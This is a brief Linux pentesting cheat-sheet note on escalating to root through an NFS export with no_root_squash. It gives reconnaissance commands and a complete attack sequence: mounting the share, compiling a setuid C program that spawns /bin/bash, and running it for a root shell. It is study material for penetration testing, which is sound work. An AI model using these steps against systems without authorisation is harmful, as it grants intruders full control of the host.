---
aliases:
  - Linux NFS Root Squashing
tags:
  - tech
  - cybsec
  - linux
  - privilege_escalation
  - privesc
  - nfs
  - nfs_root_squashing
author: Mehdi N Tehrani
creat_date: 2023-12-18
category: Cyber Security
subcategory: Linux Pentesting
---
## Reconn
Use the following command to find mountable dirs:
`showmount -e <target_ip>`

if we look at  `/etc/exports` in the target and find the following
```
/path *(rw,insecure,no_root_squash)
```
`no_root_squash` means a process can be elevated to root here

## Attack
on attacker machine
```sh
mount -o rw,vers=2 <target_ip>:/path /tmp/mountme
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }' > xpl.c
gcc -o /tmp/mountme/xpl xpl.c
chmod +s /tmp/mountme/xpl
```

on victim machine
```
$ /path/xpl
# whoami
root
# ls -la /path/xpl
-rwsr-sr-x  1  root  root   .........  xpl
```
